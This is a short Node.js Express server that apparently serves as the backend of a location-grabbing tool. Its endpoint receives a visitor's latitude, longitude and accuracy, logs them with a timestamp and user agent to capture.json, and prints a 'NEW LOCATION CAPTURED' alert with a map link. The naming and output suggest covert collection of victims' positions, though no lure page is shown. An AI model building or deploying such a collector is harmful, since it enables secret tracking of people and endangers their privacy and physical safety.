const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 5000;
const LOG_FILE = path.join(__dirname, 'capture.json');

app.use(cors());
app.use(express.json());

app.post('/save-location', (req, res) => {
  const { latitude, longitude, accuracy } = req.body;

  if (!latitude || !longitude) {
    return res.status(400).json({ error: 'Missing coordinates' });
  }

  const logEntry = {
    latitude,
    longitude,
    accuracy,
    timestamp: new Date().toLocaleString('en-GB', { hour12: false }).replace(',', ' |'),
    userAgent: req.headers['user-agent']
  };

  let logs = [];
  if (fs.existsSync(LOG_FILE)) {
    try {
      logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
    } catch (e) {
      console.error('Error parsing capture.json', e);
    }
  }

  logs.push(logEntry);

  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

  console.log('\n========================================');
  console.log('  [ALERT] NEW LOCATION CAPTURED!');
  console.log('========================================');
  console.log(` > COORD:    ${latitude}, ${longitude}`);
  console.log(` > MAP:      https://www.google.com/maps?q=${latitude},${longitude}`);
  console.log(` > TIME:     ${logEntry.timestamp}`);
  console.log('========================================\n');

  res.json({ success: true, message: 'Location saved successfully' });
});

app.listen(PORT, () => {
  console.log(`Backend server running on http://localhost:${PORT}`);
});
